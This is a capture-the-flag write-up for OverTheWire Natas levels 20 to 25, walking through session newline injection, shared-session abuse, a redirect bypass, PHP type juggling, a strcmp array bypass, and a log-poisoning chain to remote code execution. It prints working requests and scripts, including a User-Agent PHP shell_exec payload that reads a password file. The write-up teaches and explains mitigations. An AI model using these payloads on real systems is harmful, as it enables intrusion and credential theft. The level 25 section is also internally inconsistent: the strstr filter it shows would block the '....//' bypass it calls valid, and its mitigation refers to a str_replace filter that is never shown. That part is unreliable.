
## Level 20 → Level 21

**Title:** Session Manipulation via Newline Injection in Custom Session Handler

**Summary:**
This level uses a custom-built PHP session handler instead of PHP's built-in one. Sessions are stored as flat text files with key-value pairs separated by newlines. The `name` parameter is written directly into the session file without sanitization — which means injecting a newline character into the name lets you add arbitrary key-value pairs to the session, including `admin 1`. Two requests are all it takes.

---

### Steps to Reproduce
1. Log in at `http://natas20.natas.labs.overthewire.org`
2. View the source — session data is stored line by line in a file:
   ```php
   function mywrite($sid, $data) {
       // stores key value pairs separated by newlines
   }
   ```
   The `name` parameter is written to the session file unsanitized
3. Send a request with a newline-injected `name` parameter. The `\n` injects a second line into the session file:
   ```
   http://natas20.natas.labs.overthewire.org/?name=admin%0aadmin+1&debug
   ```
   - `%0a` is a URL-encoded newline (`\n`)
   - This writes two lines to the session file: `name admin` and `admin 1`
4. The session file now contains:
   ```
   name admin
   admin 1
   ```
5. Make a second request using the same `PHPSESSID` cookie (don't change it):
   ```
   http://natas20.natas.labs.overthewire.org/?debug
   ```
6. The server reads the session file, sees `admin => 1`, and displays the password for natas21

Using Python to automate both requests:
```python
import requests

url = "http://natas20.natas.labs.overthewire.org"
auth = ("natas20", "[password]")

# First request: inject the newline to write admin 1 to the session file
r1 = requests.get(url, params={"name": "admin\nadmin 1", "debug": ""}, auth=auth)
phpsessid = r1.cookies["PHPSESSID"]
print(f"[+] Session ID: {phpsessid}")

# Second request: reuse the same session — server now reads admin=1
r2 = requests.get(url, params={"debug": ""}, auth=auth, cookies={"PHPSESSID": phpsessid})
print(r2.text)
```

---

### Impact
Custom session handlers are tricky to get right — and this one got it very wrong. Newline injection into a file-based store lets an attacker write arbitrary session data, effectively forging any session value they want. The same class of vulnerability applies to log injection, CSV injection, and any other context where newlines carry structural meaning and user input isn't stripped of them.

---

### Mitigation
Any user input written to a structured file format must be sanitized to strip or escape control characters — especially newlines (`\n`, `\r`). In this specific case, the name should have been filtered with something like `str_replace("\n", "", $name)` before being stored. More broadly, custom session implementations should be avoided unless absolutely necessary — PHP's built-in session handler is far more hardened than anything a developer is likely to write from scratch.

---

### Takeaways
- Newline injection is an underrated technique. Whenever user input ends up in a file or structured format, test for `%0a` and `%0d`.
- The `debug` parameter here is a reminder to always check for developer-facing flags left in production — they often reveal exactly what's happening under the hood.
- Custom implementations of standard functionality are a common source of security bugs. Reinventing the wheel is risky.

---
---

## Level 21 → Level 22

**Title:** Cross-Site Session Sharing Between Two Related Applications

**Summary:**
This level introduced something new — two separate web applications sharing the same session backend. The main natas21 site checks whether `admin=1` is set in the session, but doesn't provide any way to set it. A linked "experimenter" site, however, lets you freely set session variables with no restrictions. Since both apps share sessions, you just need to set `admin=1` on the experimenter site and then present that same session ID to the main site.

---

### Steps to Reproduce
1. Log in at `http://natas21.natas.labs.overthewire.org`
2. The page says you need to be admin — view the source to confirm it checks `$_SESSION["admin"] == 1`
3. Notice the page mentions a second "experimenter" site:
   ```
   http://natas21-experimenter.natas.labs.overthewire.org
   ```
4. Visit the experimenter site — it has a CSS styling form that lets you set arbitrary session variables via POST parameters. Any POST parameter gets stored directly to the session:
   ```php
   foreach($_REQUEST as $key => $val) {
       $_SESSION[$key] = $val;
   }
   ```
5. Submit a POST request to the experimenter site with `admin=1`:
   ```bash
   curl -u natas21:[password] \
     http://natas21-experimenter.natas.labs.overthewire.org/ \
     --data "admin=1" -v
   ```
   Note the `PHPSESSID` cookie returned in the response
6. Take that `PHPSESSID` and send it to the main natas21 site:
   ```bash
   curl -u natas21:[password] \
     http://natas21.natas.labs.overthewire.org/ \
     -H "Cookie: PHPSESSID=[session_id_from_experimenter]"
   ```
7. The main site reads `admin=1` from the shared session and reveals the password for natas22

---

### Impact
Session sharing between applications is a legitimate architectural pattern, but it comes with a serious responsibility: every app in the shared session ecosystem must apply consistent and equally strict access controls. One weak application in the group effectively undermines the security of all the others. This is a real concern in microservice architectures and multi-app environments where sessions or tokens are shared across services.

---

### Mitigation
Applications sharing a session backend should each independently validate and sanitize the values they read from the session — not blindly trust whatever is stored there. Setting session variables directly from request parameters (`$_SESSION[$key] = $val`) without any allowlist or type checking is asking for trouble. Each application should also be treated as a potential attack surface, even if it's considered "internal" or "experimental."

---

### Takeaways
- Security boundaries between applications in a shared environment are only as strong as the weakest app.
- Never allow arbitrary request parameters to be written directly to a session without validation.
- "Experimental" or "staging" apps with relaxed security that share infrastructure with production are a common real-world finding.

---
---

## Level 22 → Level 23

**Title:** Credential Exposure Bypassing a PHP Redirect

**Summary:**
The page is simple — if you're the admin, you see the password. If not, you get immediately redirected away. The vulnerability is that PHP's `header("Location: ...")` redirect doesn't stop execution of the rest of the script unless `exit` or `die` is called right after. The full page — including the password — is generated and sent in the HTTP response body, even though the browser follows the redirect and never renders it. Bypassing the redirect is just a matter of reading the response directly.

---

### Steps to Reproduce
1. Log in at `http://natas22.natas.labs.overthewire.org`
2. Every visit redirects you away immediately
3. View the source — the logic is:
   ```php
   if(array_key_exists("revelio", $_GET)) {
       if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
           header("Location: /");
           // No exit() here — script keeps running!
       }
   }
   ```
4. Even without admin privileges, the password is rendered in the HTML that gets sent with the redirect response. Use `curl` with the `-L` flag removed (don't follow redirects) to read the response body:
   ```bash
   curl -u natas22:[password] \
     "http://natas22.natas.labs.overthewire.org/?revelio" \
     --max-redirs 0
   ```
5. The full HTML response — including the password for natas23 — is in the body of the 302 redirect response

---

### Impact
This is a surprisingly common mistake. Developers assume that issuing a redirect stops the user from seeing the page content — but the browser is just a client that chooses to follow the `Location` header. The response body is always transmitted. Tools like `curl`, Burp Suite, or any HTTP client that doesn't auto-follow redirects will see everything. Sensitive data has been exposed in production applications through this exact pattern.

---

### Mitigation
Every `header("Location: ...")` call used for access control must be immediately followed by `exit` or `die`. Without it, the redirect is cosmetic — the rest of the PHP script executes and its output is sent to the client regardless. This is a one-line fix but a critical one:
```php
header("Location: /");
exit;
```

---

### Takeaways
- HTTP redirects are a client-side instruction, not a server-side access control. The server sends the response first, redirect included.
- `curl --max-redirs 0` is a simple and useful technique for inspecting redirect responses.
- Always follow a `header("Location: ...")` with `exit`. No exceptions.

---
---

## Level 23 → Level 24

**Title:** Authentication Bypass via PHP Type Juggling

**Summary:**
The page asks for a password. The source code reveals two conditions that must both be true: the password must contain the string `"iloveyou"` and must be numerically greater than 10. At first glance those seem contradictory — a string can't be a number. But PHP's loose type comparison makes this straightforward. When PHP compares a string to an integer using `>`, it extracts any leading number from the string and uses that for the comparison.

---

### Steps to Reproduce
1. Log in at `http://natas23.natas.labs.overthewire.org`
2. View the source:
   ```php
   if(strstr($_REQUEST["passwd"], "iloveyou") && ($_REQUEST["passwd"] > 10)) {
       // show password
   }
   ```
3. Both conditions need to pass:
   - `strstr(..., "iloveyou")` — the input must contain the string `iloveyou`
   - `$_REQUEST["passwd"] > 10` — PHP will cast the string to an integer for this comparison, extracting the leading digits
4. Submit a password that satisfies both:
   ```
   11iloveyou
   ```
   - `strstr("11iloveyou", "iloveyou")` → true ✓
   - `"11iloveyou" > 10` → PHP reads the leading `11`, compares `11 > 10` → true ✓
5. The password for natas24 is revealed

---

### Impact
PHP type juggling is a well-documented class of vulnerability that has affected real-world login systems, hash comparison logic, and API authentication. The classic example is comparing a hash with `==` instead of `===` — a hash starting with `0e` gets treated as scientific notation (zero) and matches any other `0e...` hash. These bugs are subtle, don't show up as errors, and can be hard to spot in code review without knowing what to look for.

---

### Mitigation
Use strict comparison operators everywhere in PHP. `===` checks both value and type — `"11iloveyou" === 11` is false. `==` only checks value after type coercion — `"11iloveyou" == 11` is true. Beyond that, validate and type-cast input explicitly before using it in comparisons. If a field should be a number, cast it to an integer first. If it should be a string, treat it as one and don't compare it numerically.

---

### Takeaways
- PHP type juggling is a real and recurring vulnerability class. Know `==` vs `===` cold.
- `strstr()` checks for substring presence anywhere in the string — a leading number before `iloveyou` still passes the check.
- Type coercion bugs are easy to miss in code review and hard to catch with basic testing. They require deliberate security-focused analysis.

---
---

## Level 24 → Level 25

**Title:** Authentication Bypass via `strcmp()` Return Value Abuse

**Summary:**
Another password form, another source code reveal. This time the check uses `strcmp()` to compare the submitted password against the correct one. `strcmp()` seems safe — it's a standard comparison function. But in older PHP versions, passing an array instead of a string causes `strcmp()` to return `NULL` rather than a non-zero integer. And `NULL == 0` in PHP's loose comparison, which means the check silently passes. One array parameter is all it takes.

---

### Steps to Reproduce
1. Log in at `http://natas24.natas.labs.overthewire.org`
2. View the source:
   ```php
   if(!strcmp($_REQUEST["passwd"], "<censored>")) {
       // show password
   }
   ```
3. In PHP (before 8.0), passing an array to `strcmp()` triggers a warning and returns `NULL`
4. `!NULL` evaluates to `true` in PHP — so the condition passes
5. Submit the form with the password parameter as an array by modifying the request in Burp Suite or using `curl`:
   ```bash
   curl -u natas24:[password] \
     "http://natas24.natas.labs.overthewire.org/" \
     --data "passwd[]=anything"
   ```
   The `[]` notation tells PHP to treat `passwd` as an array
6. The `strcmp()` call receives an array, returns `NULL`, the `!NULL` check passes, and the password for natas25 is displayed

---

### Impact
This `strcmp()` bypass affected a significant number of PHP applications and was a well-known bug bounty and CTF finding for years. Any login form, API key check, or token comparison using `strcmp()` without type-checking the input first was potentially vulnerable. The `NULL` return is silent — no error visible to the user, no obvious sign anything went wrong — making it easy to overlook even during testing.

---

### Mitigation
Always validate that inputs are the expected type before passing them to comparison functions. If `passwd` should be a string, reject any request where it's an array: `if(!is_string($_REQUEST["passwd"])) { die(); }`. Also use `===` for comparisons where possible — `strcmp() === 0` instead of `!strcmp()` won't fix the NULL issue, but strict type checks upstream will. In PHP 8.0+, this was fixed and `strcmp()` throws a fatal error instead of returning NULL, but older codebases remain vulnerable.

---

### Takeaways
- Standard library functions don't always behave the way you expect when given unexpected input types.
- The `[]` suffix in a POST parameter name is all it takes to pass an array in PHP — a simple trick worth knowing.
- Type validation before comparison functions is a basic hygiene practice. Never assume input is the type you expect.

---
---

## Level 25 → Level 26

**Title:** Path Traversal + Log Injection via User-Agent Header for RCE

**Summary:**
This was the most layered level so far — two separate vulnerabilities chained together to achieve code execution. The page includes language files based on a URL parameter, with a filter that tries to block path traversal. The filter is flawed and bypassable. But even with traversal working, the password file is explicitly blocked. The workaround: the application writes a log file that includes the HTTP User-Agent header — unsanitized. Inject PHP code into the User-Agent, use path traversal to include the log file, and the injected PHP executes, printing the password.

---

### Steps to Reproduce
1. Log in at `http://natas25.natas.labs.overthewire.org`
2. View the source — the `lang` parameter is used to include a language file:
   ```php
   function safeinclude($filename) {
       if(strstr($filename, "../")) {
           logRequest("Illegal file access detected!");
           exit(-1);
       }
       if(strstr($filename, "natas_webpass")) {
           logRequest("Illegal file access detected! Aborting!");
           exit(-1);
       }
       include($filename);
   }
   ```
3. The `../` check relies on a simple substring match using `strstr($filename, "../")`. While this blocks literal `../` sequences, it does
   not prevent traversal once the path is normalized by the filesystem.
   A payload such as:
   ```php
   ?lang=....//....//....//....//var/www/natas/natas25/logs/natas25_[PHPSESSID].log
   ```

   is resolved by the filesystem into a valid traversal path. Because the filter only checks for the exact substring `"../"` before inclusion and does not canonicalize the path, it can be bypassed using equivalent traversal patterns.
   Direct access to `/etc/natas_webpass/natas26` is additionally blocked by a separate check for `"natas_webpass"`, which prevents straightforward password file inclusion and requires a chained approach instead.

4. Notice the `logRequest()` function writes to a log file at:
   ```
   /var/www/natas/natas25/logs/natas25_[PHPSESSID].log
   ```
   And it includes the `User-Agent` header directly in the log — unsanitized:
   ```php
   $log = $log . $_SERVER['HTTP_USER_AGENT'];
   ```
5. In Burp Suite, intercept any request to natas25 and set the User-Agent to a PHP payload:
   ```
   User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
   ```
6. Trigger the log write by sending a request with an illegal `lang` value:
   ```
   ?lang=....//etc/passwd
   ```
   This hits the `../` check (or an invalid path), causing `logRequest()` to run and write your User-Agent into the log
7. Now use path traversal to include the log file:
   ```
   ?lang=....//....//....//....//var/www/natas/natas25/logs/natas25_[PHPSESSID].log
   ```
8. The PHP in the log file executes and the password for natas26 is printed on the page

---

### Impact
This is a realistic attack chain — path traversal enabling log file inclusion, combined with log injection via an HTTP header, resulting in Remote Code Execution. Each individual vulnerability is serious on its own; chained together they produce a critical finding. Real-world penetration tests regularly uncover multi-step chains like this, where no single bug is catastrophic but the combination is.

---

### Mitigation
Several fixes are needed here, each addressing a different link in the chain. The path traversal filter should use a proper allowlist — only serve files from a known-safe directory, reject anything else outright. The `str_replace` approach for removing `../` is bypassable (as shown above) and should not be used as a security control. Log files must never include unvalidated external input — the User-Agent header should be sanitized before being written anywhere. And log files should never be stored inside the web root where they can be included or served directly.

---

### Takeaways
- Vulnerability chaining is how real attacks work. Two individually limited bugs became RCE when combined.
- `str_replace` to remove `../` is a textbook bypassable filter — `....//` is the classic evasion.
- HTTP headers like User-Agent are attacker-controlled. Treat them as untrusted input everywhere — including in log files.
- This level was the most complex so far. Working through it step by step — identifying each vulnerability, understanding why filters fail, and connecting the chain — is exactly the kind of thinking that separates good security testers from script kiddies.

---
